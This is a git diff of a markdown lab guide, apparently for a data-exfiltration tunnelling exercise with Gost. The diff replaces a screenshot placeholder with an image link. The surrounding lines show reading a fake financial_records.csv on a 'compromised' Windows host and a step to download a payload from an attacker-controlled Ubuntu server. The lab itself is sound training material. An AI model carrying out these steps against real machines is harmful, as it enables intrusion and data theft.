@@ -50,7 +50,7 @@ Now we switch to the compromised Windows machine. We need to download the tunnel
 ```powershell
 cat C:\Users\Administrator\Desktop\Labs\GostLab\financial_records.csv
 ```
-[Screenshot: Conținutul fișierului CSV cu datele false]
+<img width="1151" height="112" alt="image" src="https://github.com/user-attachments/assets/a4b9ed61-c81a-471f-b0cd-3089db552467" />
 
 - Download the Gost payload directly from our Ubuntu server into a temporary folder. Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.
 
